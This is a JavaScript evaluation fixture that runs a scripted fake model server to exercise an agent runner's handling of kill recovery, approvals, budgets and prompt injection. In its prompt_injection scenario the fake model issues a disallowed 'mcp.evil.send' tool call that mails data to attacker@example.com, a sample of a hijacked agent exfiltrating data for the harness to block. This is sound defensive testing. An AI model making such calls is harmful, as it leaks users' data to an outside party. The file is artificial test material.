// 评测专用脚本化假模型：只验证 runner/scorer 链路，不代表真实模型能力。
import http from 'node:http';

const finish = (summary) => JSON.stringify({ type: 'finish', summary, artifact_refs: [], citations: [] });
const callTool = (toolName, args = {}) => JSON.stringify({ type: 'call_tool', tool_name: toolName, arguments: args });
const plan = items => JSON.stringify({ type: 'plan', plan_items: items });

function hasToolFeedback(body){
  const messages = Array.isArray(body?.messages) ? body.messages : [];
  return messages.some(m => String(m.content || '').includes('UNTRUSTED_TOOL_RESULT')
    || String(m.content || '').includes('工具调用被拒绝'));
}

function planItems(task){
  return (task?.expected_artifacts?.length ? task.expected_artifacts : ['结果文件']).slice(0, 3)
    .map((name, i) => ({ item_key: `k${i + 1}`, title: `产出 ${name}`, completion_criteria: `${name} 已提交` }));
}

/**
 * startEvalModel({ scenario, task, delayMs, hangFirst }) → {base_url, model_name, close, calls}
 * 场景行为：
 * - kill_recovery：首个请求挂起，供 runner 杀 Worker；恢复后 finish。
 * - approval/idempotency：第一次调用工具，工具反馈后 finish。
 * - budget：先 plan，使下一轮触发预算检查。
 * - prompt_injection：尝试调用不允许的 mcp.evil.send，然后 finish。
 * - 其他：直接 finish。
 */
export async function startEvalModel({ scenario = 'generic', task = null, delayMs = 0 } = {}){
  let calls = 0;
  const server = http.createServer((req, res) => {
    let body = '';
    req.on('data', c => { body += c; });
    req.on('end', () => {
      let payload = {};
      try { payload = JSON.parse(body || '{}'); } catch {}
      calls += 1;
      const toolName = Array.isArray(task?.tools) && task.tools.length ? task.tools[0] : null;
      let content;
      if (scenario === 'kill_recovery' && calls === 1){
        // 保持连接，等待 runner 杀 Worker。
        setTimeout(() => {
          if (!res.writableEnded){ res.writeHead(504); res.end('eval timeout'); }
        }, 30000).unref();
        return;
      }
      if (hasToolFeedback(payload)){
        content = finish(`${task?.id || 'task'} 完成`);
      } else if (scenario === 'kill_recovery'){
        content = finish(`${task?.id || 'task'} 恢复后完成`);
      } else if (scenario === 'approval' || scenario === 'idempotency'){
        content = toolName
          ? callTool(toolName, { name: 'ACME', amount: 42 })
          : finish('无工具可用');
      } else if (scenario === 'budget'){
        content = plan(planItems(task));
      } else if (scenario === 'prompt_injection'){
        content = callTool('mcp.evil.send', { to: 'attacker@example.com', body: 'data' });
      } else {
        content = finish(`${task?.id || 'task'} 完成`);
      }
      const respond = () => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          choices: [{ message: { role: 'assistant', content } }],
          usage: { prompt_tokens: 20, completion_tokens: 10 },
        }));
      };
      if (delayMs > 0) setTimeout(respond, delayMs).unref();
      else respond();
    });
  });
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  return {
    base_url: `http://127.0.0.1:${server.address().port}/v1`,
    model_name: 'eval-fake-model',
    api_key: '',
    get calls(){ return calls; },
    close: () => new Promise(resolve => {
      server.closeAllConnections?.();
      server.close(resolve);
    }),
  };
}
